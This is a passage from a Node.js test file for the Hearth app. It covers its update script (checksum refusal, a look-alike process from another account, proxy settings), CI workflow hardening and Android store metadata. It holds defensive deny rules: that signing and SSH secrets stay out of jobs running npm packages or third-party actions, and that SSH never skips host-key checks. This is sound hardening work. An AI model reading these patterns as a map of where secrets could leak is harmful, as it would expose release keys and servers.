  const lab = updateLab();
  try {
    fs.writeFileSync(lab.zip + '.sha256', `${'0'.repeat(64)}  update.zip\n`);
    const bad = lab.run('--yes', lab.zip);
    assert.notEqual(bad.status, 0);
    assert.match(bad.stdout + bad.stderr, /doesn't match its checksum/);
    assert.equal(fs.readFileSync(path.join(lab.app, 'server/index.js'), 'utf8'), '// old\n');
    assert.ok(!fs.readdirSync(path.join(lab.t, 'backups')).some((f) => /^\d{4}-/.test(f)), 'not even a backup was started');
    assert.equal(lab.calls(), '');
    // No path at all: it never falls back to a fixed /tmp file.
    const none = lab.run('--yes');
    assert.notEqual(none.status, 0);
    assert.match(none.stdout + none.stderr, /Which update\?/);
    // The right checksum goes through.
    const sum = crypto.createHash('sha256').update(fs.readFileSync(lab.zip)).digest('hex');
    fs.writeFileSync(lab.zip + '.sha256', `${sum}  update.zip\r\n`);
    const good = lab.run('--yes', lab.zip);
    assert.equal(good.status, 0, good.stdout + good.stderr);
    assert.match(good.stdout, /Checksum matches/);
    await lab.started();
  } finally { lab.done(); }
});

const shellSkip = !shellReady() && 'needs bash, zip, unzip, rsync';

test('root-owned program files with a user-owned data/: libraries installed by root, Hearth started as the user', { skip: shellSkip }, async () => {
  const lab = updateLab({ owner: 'alice', progOwner: 'root', newLock: true });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    const calls = await lab.started();
    // npm ci and the files stay root's (nobody else can change root's program files)...
    assert.match(calls, /^npm ci --omit=dev --no-audit --no-fund as=root$/m);
    assert.doesNotMatch(calls, /^setpriv .* -- npm /m);
    assert.doesNotMatch(calls, /^chown /m);
    // ...and Hearth itself runs as alice, through setpriv with nothing left behind as root.
    assert.match(calls, /^setpriv --reuid=alice --regid=1000 --init-groups -- nohup node server\/index\.js$/m);
    assert.match(calls, /^node server\/index\.js as=alice /m);
  } finally { lab.done(); }
});

test('a look-alike "node server/index.js" started by another account never decides who Hearth runs as', { skip: shellSkip }, async () => {
  // mallory can enter the folder and starts a process that looks like Hearth (same name, command and folder).
  const lab = updateLab({ owner: 'alice', proc: 'mallory' });
  try {
    await sleep(300);
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, new RegExp(`Ignoring node processes .*mallory \\(PID ${lab.fake.pid}\\)`));
    const calls = await lab.started();
    assert.match(calls, /^node server\/index\.js as=alice /m, 'restarted as data/\'s owner');
    assert.doesNotMatch(calls, /mallory/);
    await sleep(300);
    assert.ok(lab.fake.exitCode !== null || lab.fake.signalCode !== null, 'the look-alike was stopped with the old version');
  } finally { lab.done(); }
  // The real Hearth process (same owner as data/) is simply used.
  const same = updateLab({ owner: 'alice', proc: 'alice' });
  try {
    await sleep(300);
    const r = same.run('--yes', same.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.doesNotMatch(r.stdout, /Ignoring node processes/);
    assert.match(await same.started(), /^node server\/index\.js as=alice /m);
  } finally { same.done(); }
  // A Hearth that root started (only root can) stays root, as before, with the warning.
  const asRoot = updateLab({ owner: 'alice', proc: 'root' });
  try {
    await sleep(300);
    const r = asRoot.run('--yes', asRoot.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /Hearth runs as root/);
    assert.match(await asRoot.started(), /^node server\/index\.js as=root /m);
  } finally { asRoot.done(); }
});

// ------------------------------------------------------------------ TRUST_PROXY on update (older installs)
test('updating an older Docker install keeps visitors\' addresses: TRUST_PROXY is set to Caddy\'s network in .env', { skip: shellSkip }, async () => {
  const lab = updateLab({ docker: true, env: 'HTTPS=false\nHEARTH_BIND=127.0.0.1' });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /Hearth now only believes Caddy's network, 172\.19\.0\.0\/16/);
    const envFile = path.join(lab.app, '.env');
    const env = fs.readFileSync(envFile, 'utf8');
    assert.match(env, /^HEARTH_BIND=127\.0\.0\.1\n# Added by hearth-update/m, 'appended on a line of its own');
    assert.match(env, /^TRUST_PROXY=172\.19\.0\.0\/16$/m);
    // The new container starts with it.
    assert.match(await lab.started(), /docker compose up, \.env says: TRUST_PROXY=172\.19\.0\.0\/16/);
    // A rollback puts the old .env back, along with the old version (which has the old rule).
    const back = lab.run('--rollback', '--yes');
    assert.equal(back.status, 0, back.stdout + back.stderr);
    assert.equal(fs.readFileSync(envFile, 'utf8'), 'HTTPS=false\nHEARTH_BIND=127.0.0.1');
    // Updating again adds it again, and only once however often it runs.
    for (let i = 0; i < 2; i++) {
      const again = lab.run('--yes', lab.zip);
      assert.equal(again.status, 0, again.stdout + again.stderr);
      assert.equal(fs.readFileSync(envFile, 'utf8').match(/^TRUST_PROXY=/gm).length, 1);
    }
  } finally { lab.done(); }
});

test('the Docker TRUST_PROXY upgrade never overrides a choice, writes through a link, or misses another proxy', { skip: shellSkip }, async () => {
  // Already chosen in .env: untouched.
  let lab = updateLab({ docker: true, env: 'HTTPS=false\nHEARTH_BIND=127.0.0.1\nTRUST_PROXY=10.0.0.5\n' });
  try {
    assert.equal(lab.run('--yes', lab.zip).status, 0);
    assert.equal(fs.readFileSync(path.join(lab.app, '.env'), 'utf8'), 'HTTPS=false\nHEARTH_BIND=127.0.0.1\nTRUST_PROXY=10.0.0.5\n');
  } finally { lab.done(); }
  // A docker-compose.yml that already names Caddy's network (this version's): nothing to add, no .env made.
  lab = updateLab({ docker: true, compose: read('docker-compose.yml') });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.ok(!fs.existsSync(path.join(lab.app, '.env')));
    assert.doesNotMatch(r.stdout, /TRUST_PROXY/);
  } finally { lab.done(); }
  // .env is a link (to somewhere root shouldn't write): not followed; the operator is told what to do instead.
  lab = updateLab({ docker: true });
  try {
    const elsewhere = path.join(lab.t, 'elsewhere');
    fs.writeFileSync(elsewhere, 'precious\n');
    fs.symlinkSync(elsewhere, path.join(lab.app, '.env'));
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.equal(fs.readFileSync(elsewhere, 'utf8'), 'precious\n');
    assert.match(r.stdout, /couldn't add it to \.env by itself\. Add TRUST_PROXY=/);
  } finally { lab.done(); }
  // Behind a proxy that isn't this folder's Caddy: Caddy's network is added, and the operator hears about theirs.
  lab = updateLab({ docker: true, env: 'HTTPS=false\n', caddy: false });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /this folder's Caddy isn't running/);
  } finally { lab.done(); }
  // The old instructions' TRUST_PROXY=1 while port 3000 is open to everyone: a warning.
  lab = updateLab({ docker: true, env: 'HTTPS=false\nTRUST_PROXY=1\n' });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /TRUST_PROXY=1 in \.env believes any address in front of Hearth/);
  } finally { lab.done(); }
});

test('plain installs behind a proxy are told about the new TRUST_PROXY rule once, when it changes', { skip: shellSkip }, async () => {
  let lab = updateLab({ env: 'HTTPS=false\n' });
  try {
    const r = lab.run('--yes', lab.zip);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /Heads-up: Hearth now only believes the visitor address/);
    assert.match(r.stdout, /add TRUST_PROXY=<its address or subnet> to .*\.env/);
    await lab.started();
  } finally { lab.done(); }
  // Not behind a proxy, already set, or already on the new rule: nothing to say.
  for (const opts of [{ env: 'HTTPS=true\n' }, { env: 'HTTPS=false\nTRUST_PROXY=10.0.0.5\n' }, { env: 'HTTPS=false\n', oldTrust: false }]) {
    lab = updateLab(opts);
    try {
      const r = lab.run('--yes', lab.zip);
      assert.equal(r.status, 0, r.stdout + r.stderr);
      assert.doesNotMatch(r.stdout, /Heads-up/, JSON.stringify(opts));
      await lab.started();
    } finally { lab.done(); }
  }
});

test('scripts/make-update-zip.sh makes the zip the updaters expect, with a matching .sha256', { skip: !(['bash', 'zip', 'unzip', 'git'].every(has) && spawnSync('git', ['rev-parse', '--git-dir'], { cwd: ROOT }).status === 0) && 'needs a git checkout' }, () => {
  const out = tmp();
  try {
    const r = spawnSync('bash', [path.join(ROOT, 'scripts/make-update-zip.sh'), out], { encoding: 'utf8', timeout: 60000 });
    assert.equal(r.status, 0, r.stdout + r.stderr);
    const version = JSON.parse(read('package.json')).version;
    const zip = path.join(out, `hearth-update-${version}.zip`);
    const [sum, name] = fs.readFileSync(zip + '.sha256', 'utf8').trim().split(/\s+/);
    assert.equal(name, path.basename(zip));
    assert.equal(sum, crypto.createHash('sha256').update(fs.readFileSync(zip)).digest('hex'));
    const list = execFileSync('unzip', ['-Z1', zip], { encoding: 'utf8' }).split('\n');
    for (const f of ['hearth/server/index.js', 'hearth/scripts/hearth-update.sh']) assert.ok(list.includes(f), f);
    assert.ok(!list.some((f) => /^hearth\/(data|node_modules)\/|\/\.env$/.test(f)), 'no data, libraries or secrets');
    // A relative folder is where you are, not inside the source tree.
    const rel = spawnSync('bash', [path.join(ROOT, 'scripts/make-update-zip.sh'), 'rel-out'], { cwd: out, encoding: 'utf8', timeout: 60000 });
    assert.equal(rel.status, 0, rel.stdout + rel.stderr);
    assert.ok(fs.existsSync(path.join(out, 'rel-out', `hearth-update-${version}.zip`)));
    assert.ok(!fs.existsSync(path.join(ROOT, 'rel-out')));
  } finally { fs.rmSync(out, { recursive: true, force: true }); }
  // The default folder, hearth/dist, and the zips themselves are ignored by git, so they can't be committed.
  for (const f of ['dist/hearth-update-9.9.9.zip', 'hearth-update-9.9.9.zip', 'hearth-update-9.9.9.zip.sha256']) {
    assert.equal(spawnSync('git', ['check-ignore', '-q', '--no-index', f], { cwd: ROOT }).status, 0, `${f} is ignored`);
  }
  assert.match(read('scripts/make-update-zip.sh'), /OUT="\$\{OUT:-\$\(pwd\)\/dist\}"/);
});

// ------------------------------------------------------------------ CI workflows (infra-3)
// Read as text (no YAML library here): each workflow file, split into jobs and steps by indentation.
const workflowFiles = () => [path.join(ROOT, '..', '.github', 'workflows'), path.join(ROOT, '.github', 'workflows')]
  .filter((d) => fs.existsSync(d))
  .flatMap((d) => fs.readdirSync(d).filter((f) => /\.ya?ml$/.test(f)).map((f) => path.join(d, f)));

function jobsOf(text) {
  const lines = text.split('\n');
  const start = lines.findIndex((l) => /^jobs:\s*$/.test(l));
  const head = lines.slice(0, start).join('\n');
  const jobs = {}; let cur = null;
  for (const l of lines.slice(start + 1)) {
    const m = /^ {2}([\w-]+):\s*$/.exec(l);
    if (m) { cur = m[1]; jobs[cur] = []; } else if (cur) jobs[cur].push(l);
  }
  return { head, jobs: Object.fromEntries(Object.entries(jobs).map(([k, v]) => [k, v.join('\n')])) };
}
// `run:` scripts: the inline value, or the indented block under `run: |`.
function runScripts(text) {
  const out = []; const lines = text.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const m = /^(\s*)(?:- )?run:\s*(.*)$/.exec(lines[i]);
    if (!m) continue;
    if (!/^[|>]/.test(m[2])) { out.push(m[2]); continue; }
    const block = []; const ind = m[1].length;
    for (let j = i + 1; j < lines.length && (!lines[j].trim() || lines[j].search(/\S/) > ind); j++) block.push(lines[j]);
    out.push(block.join('\n'));
  }
  return out;
}

test('workflows: read-only token except where a job must write, and only the release job writes', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
  for (const f of workflowFiles()) {
    const { head, jobs } = jobsOf(fs.readFileSync(f, 'utf8'));
    assert.match(head, /^permissions:\s*\n\s+contents: read\s*$/m, `${f}: top-level permissions are read-only`);
    assert.doesNotMatch(head, /: write/, f);
    for (const [name, body] of Object.entries(jobs)) {
      if (!/contents: write/.test(body)) continue;
      assert.equal(name, 'release', `${f}: only the release job may write repository contents (${name} does)`);
    }
  }
});

test('workflows: every action pinned to a commit, checkouts drop the token, installs are locked', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
  for (const f of workflowFiles()) {
    const text = fs.readFileSync(f, 'utf8');
    for (const m of text.matchAll(/^\s*(?:- )?uses:\s*([^\s#]+)/gm)) {
      if (m[1].startsWith('./') || m[1].startsWith('docker://')) continue;
      assert.match(m[1], /@[0-9a-f]{40}$/, `${f}: ${m[1]} is pinned to a full commit SHA`);
    }
    const lines = text.split('\n');
    lines.forEach((l, i) => {
      if (!/uses:\s*actions\/checkout@/.test(l)) return;
      const ind = l.search(/\S/);
      const step = [];
      for (let j = i + 1; j < lines.length && (!lines[j].trim() || lines[j].search(/\S/) > ind); j++) step.push(lines[j]);
      assert.match(step.join('\n'), /persist-credentials: false/, `${f}:${i + 1} checkout keeps no token in .git/config`);
    });
    for (const s of runScripts(text)) {
      assert.doesNotMatch(s, /\bnpm (install|i)\b/, `${f}: npm ci, not npm install: ${s}`);
      assert.doesNotMatch(s, /\bnpx (--yes|-y)\b/, `${f}: npx must not download packages: ${s}`);
      assert.doesNotMatch(s, /\$\{\{/, `${f}: values go into scripts through env:, not \${{ }}: ${s}`);
    }
  }
  // The Android build has the lockfile its npm ci needs, with the icon tool at an exact version.
  const mobile = JSON.parse(read('mobile/package.json'));
  assert.ok(fs.existsSync(path.join(ROOT, 'mobile/package-lock.json')));
  assert.match(mobile.devDependencies['@capacitor/assets'], /^\d+\.\d+\.\d+$/);
  const lock = JSON.parse(read('mobile/package-lock.json'));
  assert.deepEqual(lock.packages[''].devDependencies, mobile.devDependencies, 'lockfile matches package.json');
});

test('workflows: installers only reach everyone\'s apps from tags and the default branch', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
  for (const f of workflowFiles()) {
    const { jobs } = jobsOf(fs.readFileSync(f, 'utf8'));
    const pub = jobs['publish-to-vps'];
    if (!pub) continue;
    const cond = /^\s{4}if:\s*>?-?\s*\n?([\s\S]*?)\n\s{4}runs-on:/m.exec(pub);
    assert.ok(cond, `${f}: publish-to-vps has a condition`);
    assert.doesNotMatch(cond[1], /workflow_dispatch/, `${f}: a manual run from any branch must not publish`);
    assert.match(cond[1], /default_branch/);
  }
});

// The production environment's rules allow only the default branch and release tags: a job that enters it from
// anywhere else (a manual run on a feature branch) would fail there instead of being skipped.
test('workflows: jobs in the production environment only run for tags and the default branch', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
  let seen = 0;
  for (const f of workflowFiles()) {
    for (const [name, body] of Object.entries(jobsOf(fs.readFileSync(f, 'utf8')).jobs)) {
      if (!/^ {4}environment: production$/m.test(body)) continue;
      seen++;
      const cond = /^\s{4}if:\s*>?-?\s*\n?([\s\S]*?)\n\s{4}runs-on:/m.exec(body);
      assert.ok(cond, `${f}: ${name} has a condition`);
      assert.doesNotMatch(cond[1], /workflow_dispatch|event_name/, `${f}: ${name} must not run for a manual run from any branch`);
      assert.match(cond[1], /refs\/tags\/|default_branch/, `${f}: ${name}`);
    }
  }
  assert.ok(seen > 0, 'some job runs in the production environment');
});

// The steps of a job, as text: each starts at "      - ".
const stepsOf = (job) => job.split(/\n(?= {6}- )/).filter((s) => /^ {6}- /.test(s));

test('workflows: release secrets only in "production" jobs that install no npm packages; only final, signed files are published; no signing key is made or cached', { skip: !fs.existsSync(path.join(ROOT, '..', '.github', 'workflows', 'hearth-apps.yml')) && 'no apps workflow in this checkout' }, () => {
  const text = fs.readFileSync(path.join(ROOT, '..', '.github', 'workflows', 'hearth-apps.yml'), 'utf8');
  const { jobs } = jobsOf(text);
  // The Android key comes from secrets only: none is generated, kept in the Actions cache, or protected by a
  // password written here.
  assert.doesNotMatch(text, /actions\/cache@|keytool -genkeypair|hearth-build/);
  assert.doesNotMatch(text, /HEARTH_(KEYSTORE|KEY)_PASSWORD:[^\n]*\|\| '/, 'no fallback password');
  // Signing and publishing secrets only in jobs of the "production" environment (protection rules apply there),
  // and never in a job that runs code from npm packages or the build tools.
  for (const [name, body] of Object.entries(jobs)) {
    if (!/secrets\.(UPDATE_SIGNING_KEY|VPS_SSH_KEY|PLAY_SERVICE_ACCOUNT_JSON)\b/.test(body)) continue;
    assert.match(body, /^ {4}environment: production$/m, `${name} runs in the production environment`);
    assert.doesNotMatch(body, /\bnpm (ci|install|i)\b|\bnpx\b|electron-builder|gradlew/, `${name} installs no npm packages and runs no build`);
  }
  for (const name of ['sign-updates', 'release', 'publish-to-vps', 'play-upload']) assert.match(jobs[name] || '', /^ {4}environment: production$/m, name);
  assert.doesNotMatch(jobs.desktop, /secrets\.UPDATE_SIGNING_KEY/, 'the build only gets the public key');
  assert.match(jobs.desktop, /UPDATE_PUBLIC_KEY: \$\{\{ vars\.UPDATE_PUBLIC_KEY \}\}/);
  // An unsigned APK is named and uploaded as such, apart from the signed one.
  assert.match(jobs.android, /if: steps\.secretkey\.outputs\.found == '1'\n\s+with:\n\s+name: hearth-android\n/);
  assert.match(jobs.android, /name: hearth-android-UNSIGNED\n\s+path: hearth\/mobile\/unsigned\/\*-UNSIGNED\.apk/);
  assert.match(jobs.android, /"\.\.\/unsigned\/Hearth-\$VERSION_NAME-UNSIGNED\.apk"/);
  // The release and the server copy download only the final artifacts by name, never "everything in the run", and
  // refuse anything unsigned or intermediate before publishing.
  const glob = (p) => new RegExp(`^${p.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*')}$`);
  for (const name of ['release', 'publish-to-vps']) {
    const steps = stepsOf(jobs[name]);
    const downloads = steps.filter((s) => /uses: actions\/download-artifact@/.test(s));
    assert.ok(downloads.length >= 2, name);
    for (const s of downloads) {
      const want = /^\s+(?:pattern|name): (\S+)$/m.exec(s);
      assert.ok(want, `${name}: every download names what it takes`);
      for (const other of ['hearth-windows-unsigned-app', 'hearth-windows-unsigned-setup', 'hearth-android-UNSIGNED', 'hearth-android-play-bundle']) {
        assert.doesNotMatch(other, glob(want[1]), `${name} never downloads ${other}`);
      }
    }
    const refuse = steps.findIndex((s) => s.includes('name: Refuse unsigned and intermediate files'));
    const publish = steps.findIndex((s) => /softprops\/action-gh-release|name: Copy installers to the server/.test(s));
    assert.ok(refuse >= 0 && refuse < publish, `${name} refuses unsigned files before publishing`);
    assert.match(steps[refuse], /bad=\(dist\/\*unsigned\* dist\/\*\.aab\)/);
    assert.match(steps[refuse], /nocaseglob/);
  }
});

// ------------------------------------------------------------------ the Android app in the stores (docs/ANDROID-STORES.md)
// Top-level `name { ... }` blocks of a Gradle file, with what comes before each brace as its head.
function gradleBlocks(src) {
  const text = src.replace(/\/\/[^\n]*/g, '');
  const out = []; let depth = 0; let start = -1; let head = '';
  for (let i = 0; i < text.length; i++) {
    if (text[i] === '{') {
      if (depth === 0) { head = /([^\n;{}]*)$/.exec(text.slice(0, i))[1].trim(); start = i + 1; }
      depth++;
    } else if (text[i] === '}') {
      depth--;
      assert.ok(depth >= 0, 'braces balance');
      if (depth === 0) out.push({ head, body: text.slice(start, i) });
    }
  }
  assert.equal(depth, 0, 'braces balance');
  return out;
}
const appsWorkflow = path.join(ROOT, '..', '.github', 'workflows', 'hearth-apps.yml');

test('android build: the APK leaves out the dependency-info signing block (IzzyOnDroid, F-Droid), the Play bundle keeps it, and the APK keeps the name IzzyOnDroid looks for', { skip: (!fs.existsSync(appsWorkflow) || !has('bash')) && 'needs the apps workflow and bash' }, () => {
  const { jobs } = jobsOf(fs.readFileSync(appsWorkflow, 'utf8'));
  const step = stepsOf(jobs.android).find((s) => s.includes('name: Create the Android project'));
  assert.ok(step, 'the android job creates the project');
  // The heredoc appended to build.gradle, run as the runner runs it (YAML removes the block's indentation).
  const lines = runScripts(step)[0].split('\n');
  const ind = Math.min(...lines.filter((l) => l.trim()).map((l) => l.search(/\S/)));
  const script = lines.map((l) => l.slice(ind)).join('\n');
  const start = script.indexOf('cat >> android/app/build.gradle <<EOF');
  const close = /\nEOF(?:\n|$)/.exec(script.slice(start));
  assert.ok(start >= 0 && close, 'the build.gradle additions are one heredoc');
  const end = start + close.index;
  const t = tmp();
  try {
    fs.mkdirSync(path.join(t, 'android', 'app'), { recursive: true });
    const r = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', script.slice(start, end + 4)], { cwd: t, encoding: 'utf8', env: { ...process.env, VERSION_CODE: '12900100', VERSION_NAME: '1.29.1' } });
    assert.equal(r.status, 0, r.stdout + r.stderr);
    const gradle = fs.readFileSync(path.join(t, 'android', 'app', 'build.gradle'), 'utf8');
    assert.match(gradle, /versionCode 12900100\n\s+versionName "1\.29\.1"/);
    assert.match(gradle, /implementation "androidx\.webkit:webkit:\$androidxWebkitVersion"/, 'Gradle, not the shell, reads that version');
    // In an android { } block of its own, not the one that only signed builds get.
    const infos = gradleBlocks(gradle).filter((b) => b.head === 'android').flatMap((b) => gradleBlocks(b.body)).filter((b) => b.head === 'dependenciesInfo');
    assert.equal(infos.length, 1, 'one dependenciesInfo block, for every build');
    assert.match(infos[0].body, /^\s*includeInApk = false\s*$/m, 'not in the APK');
    assert.match(infos[0].body, /^\s*includeInBundle = true\s*$/m, 'still in the Play bundle');
    assert.doesNotMatch(gradle, /includeInApk = true/);
  } finally { fs.rmSync(t, { recursive: true, force: true }); }
  // IzzyOnDroid takes the release's Hearth-<version>.apk (pattern ^Hearth-[0-9.]+\.apk$), not the Hearth.apk copy.
  assert.match(jobs.android, /cp app\/build\/outputs\/apk\/release\/app-release\.apk "\.\.\/dist\/Hearth-\$VERSION_NAME\.apk"/);
  const izzy = /^Hearth-[0-9.]+\.apk$/;
  assert.ok(izzy.test('Hearth-1.29.1.apk') && !izzy.test('Hearth.apk') && !izzy.test('Hearth-1.30.0-beta.1.apk'));
  assert.match(read('docs/ANDROID-STORES.md'), /\^Hearth-\[0-9\.\]\+\\\.apk\$/);
});

// Width, height, bit depth and colour type (2: RGB, 6: RGB with alpha) from a PNG's header.
function pngInfo(file) {
  const b = fs.readFileSync(file);
  assert.equal(b.toString('latin1', 1, 4), 'PNG', `${file} is a PNG`);
  return { w: b.readUInt32BE(16), h: b.readUInt32BE(20), depth: b[24], color: b[25], size: b.length };
}

test('android store listing (fastlane): text within the stores\' limits and honest about the Android app; pictures in the sizes Google Play takes', () => {
  const dir = path.join(ROOT, 'mobile', 'fastlane', 'metadata', 'android', 'en-US');
  const text = (f) => fs.readFileSync(path.join(dir, f), 'utf8').replace(/\n$/, '');
  const len = (s) => [...s].length;
  const title = text('title.txt'); const short = text('short_description.txt'); const full = text('full_description.txt');
  assert.ok(len(title) >= 1 && len(title) <= 30 && !title.includes('\n'), 'Play: a name of up to 30 characters');
  assert.ok(len(short) <= 80 && !short.includes('\n'), 'Play: a short description of up to 80 characters');
  assert.doesNotMatch(short, /\.$/, 'F-Droid: no full stop at the end of the summary');
  assert.ok(len(full) <= 4000, 'Play and F-Droid: up to 4000 characters');
  // No other company's trademark; screen sharing only where it says the Android app lacks it (mobile/README.md);
  // closed-app notifications need a push app; the default server is the one the app opens.
  assert.doesNotMatch(`${title}\n${short}\n${full}`, /discord/i);
  // Nor other services' names (Google Play's listing rules): generic words for the video sites, GIF search and STUN.
  assert.doesNotMatch(`${title}\n${short}\n${full}`, /\b(youtube|vimeo|twitch|google|giphy|klipy|whatsapp|telegram|slack)\b/i);
  const [does, lacks] = full.split('NOT IN THE ANDROID APP YET');
  assert.ok(lacks, 'says what the Android app lacks');
  assert.doesNotMatch(does, /screen.?shar/i);
  assert.match(lacks, /Screen sharing/);
  assert.match(read('mobile/README.md'), /^\* \*\*Screen sharing\*\* — Android's web view can't capture the screen/m);
  assert.match(full, /UnifiedPush distributor app, such as ntfy/);
  assert.ok(full.includes(new URL(JSON.parse(read('mobile/www/config.json')).defaultServer).host), 'names the server the app opens by default');
  // Changelogs: default.txt (used when there's no file for the build's versionCode) or <versionCode>.txt.
  const logs = fs.readdirSync(path.join(dir, 'changelogs'));
  assert.ok(logs.includes('default.txt'));
  for (const f of logs) {
    assert.match(f, /^(default|\d+)\.txt$/);
    assert.ok(len(text(`changelogs/${f}`)) <= 500, `F-Droid: ${f} up to 500 characters`);
  }
  // Pictures: 512 x 512 icon (32-bit PNG, up to 1 MB); 1024 x 500 feature graphic and 2 to 8 phone screenshots as
  // 24-bit PNGs without alpha, sides 320 to 3840 pixels, the long side at most twice the short one.
  const icon = pngInfo(path.join(dir, 'images', 'icon.png'));
  assert.deepEqual([icon.w, icon.h, icon.depth, icon.color], [512, 512, 8, 6]);
  assert.ok(icon.size <= 1024 * 1024);
  const feature = pngInfo(path.join(dir, 'images', 'featureGraphic.png'));
  assert.deepEqual([feature.w, feature.h, feature.depth, feature.color], [1024, 500, 8, 2]);
  const shots = fs.readdirSync(path.join(dir, 'images', 'phoneScreenshots')).sort();
  assert.ok(shots.length >= 2 && shots.length <= 8, 'Play: 2 to 8 phone screenshots');
  for (const f of shots) {
    assert.match(f, /^\d+\.png$/);
    const s = pngInfo(path.join(dir, 'images', 'phoneScreenshots', f));
    assert.deepEqual([s.depth, s.color], [8, 2], `${f}: 24-bit, no alpha`);
    assert.ok(Math.min(s.w, s.h) >= 320 && Math.max(s.w, s.h) <= 3840, `${f}: ${s.w}x${s.h}`);
    assert.ok(Math.max(s.w, s.h) <= 2 * Math.min(s.w, s.h), `${f}: ${s.w}x${s.h} is longer than 2:1`);
  }
  // Committed, not caught by the ignore rule for the generated Android project (mobile/.gitignore: /android/).
  if (spawnSync('git', ['rev-parse', '--git-dir'], { cwd: ROOT }).status === 0) {
    for (const f of ['title.txt', 'images/icon.png', 'images/phoneScreenshots/1.png']) {
      assert.notEqual(spawnSync('git', ['check-ignore', '-q', '--no-index', path.join('mobile', 'fastlane', 'metadata', 'android', 'en-US', f)], { cwd: ROOT }).status, 0, `${f} isn't ignored`);
    }
    assert.equal(spawnSync('git', ['check-ignore', '-q', '--no-index', 'mobile/android/app/build.gradle'], { cwd: ROOT }).status, 0, 'the generated project still is');
  }
  // The publishing guide is linked from the signing guide and the app's README, and its own links lead somewhere.
  assert.match(read('docs/SIGNING.md'), /\]\(ANDROID-STORES\.md\)/);
  assert.match(read('mobile/README.md'), /\]\(\.\.\/docs\/ANDROID-STORES\.md\)/);
  const guide = read('docs/ANDROID-STORES.md');
  for (const m of guide.matchAll(/\]\((?!https?:|mailto:|#)([^)#\s]+)(#[^)\s]*)?\)/g)) {
    assert.ok(fs.existsSync(path.join(ROOT, 'docs', m[1])), `ANDROID-STORES.md links to ${m[1]}, which exists`);
  }
});
const stepNamed =(f, name) => stepsOf(jobsOf(fs.readFileSync(f, 'utf8')).jobs['publish-to-vps'] || '').find((s) => s.includes(`name: ${name}`));

test('workflows: the server\'s SSH key only goes to the runner\'s own ssh, which only talks to the pinned host', { skip: !workflowFiles().length && 'no workflows in this checkout' }, () => {
  for (const f of workflowFiles()) {
    const text = fs.readFileSync(f, 'utf8');
    // No third-party action (whose Docker image or downloaded binary can change under the same commit) ever
    // gets the key: every step that mentions it is a plain run: step.
    for (const job of Object.values(jobsOf(text).jobs)) {
      for (const step of stepsOf(job)) {
        if (!/secrets\.VPS_SSH_KEY/.test(step)) continue;
        assert.doesNotMatch(step, /^\s+(?:- )?uses:/m, `${f}: a step with VPS_SSH_KEY runs no action`);
        assert.match(step, /VPS_SSH_KEY: \$\{\{ secrets\.VPS_SSH_KEY \}\}/);
      }
    }
    assert.doesNotMatch(text, /appleboy\//, f);
    for (const s of runScripts(text)) {
      if (!/\b(ssh|scp) /.test(s)) continue;
      assert.match(s, /StrictHostKeyChecking=yes/, `${f}: host keys are always checked`);
      assert.doesNotMatch(s, /StrictHostKeyChecking=(no|accept-new)/, f);
    }
  }
});

test('workflows: the server copy refuses an unpinned or different host, and copies only to the pinned one', { skip: (!workflowFiles().length || !['bash', 'ssh-keygen'].every(has)) && 'needs the workflows and ssh-keygen' }, () => {
  const files = workflowFiles().filter((f) => stepNamed(f, 'Copy installers to the server'));
  assert.ok(files.length >= 1);
  const t = tmp();
  try {
    // Two host keys the "server" offers, and one it doesn't have.
    const keys = {};
    for (const [n, type] of [['ed', 'ed25519'], ['ec', 'ecdsa'], ['other', 'ed25519']]) {
      execFileSync('ssh-keygen', ['-q', '-t', type, '-N', '', '-C', n, '-f', path.join(t, n)]);
      keys[n] = { line: `203.0.113.5 ${fs.readFileSync(path.join(t, `${n}.pub`), 'utf8').trim().split(' ').slice(0, 2).join(' ')}`, fp: execFileSync('ssh-keygen', ['-lf', path.join(t, `${n}.pub`)], { encoding: 'utf8' }).split(' ')[1] };
    }
    const bin = path.join(t, 'bin');
    fs.mkdirSync(bin);
    const calls = path.join(t, 'calls.log');
    stub(bin, 'ssh-keyscan', `echo '# 203.0.113.5:22 SSH-2.0-OpenSSH_9.6' >&2; printf '%s\\n' '${keys.ec.line}' '${keys.ed.line}'`);
    stub(bin, 'scp', `echo "scp $*" >> "${calls}"; for a in "$@"; do case "$a" in UserKnownHostsFile=*) cp "\${a#UserKnownHostsFile=}" "${t}/kh-used" ;; esac; done; stat -c %a "$RUNNER_TEMP/vps-ssh/key" > "${t}/key-mode"`);
    // The "server" for the clean-up step: runs what ssh was asked to run, here.
    stub(bin, 'ssh', `echo "ssh $*" >> "${calls}"; exec sh -c "\${!#}"`);
    const work = path.join(t, 'work');
    fs.mkdirSync(path.join(work, 'dist'), { recursive: true });
    fs.writeFileSync(path.join(work, 'dist', 'Hearth-Setup-1.0.0.exe'), 'x');
    // The step's script as the runner gets it (YAML removes the block's indentation; heredocs depend on that).
    const script = (f, name) => {
      const lines = runScripts(stepNamed(f, name))[0].split('\n');
      const ind = Math.min(...lines.filter((l) => l.trim()).map((l) => l.search(/\S/)));
      return lines.map((l) => l.slice(ind)).join('\n');
    };
    const runStep = (f, name, extra) => {
      fs.rmSync(calls, { force: true });
      fs.rmSync(path.join(t, 'kh-used'), { force: true });
      const runner = path.join(t, 'runner');
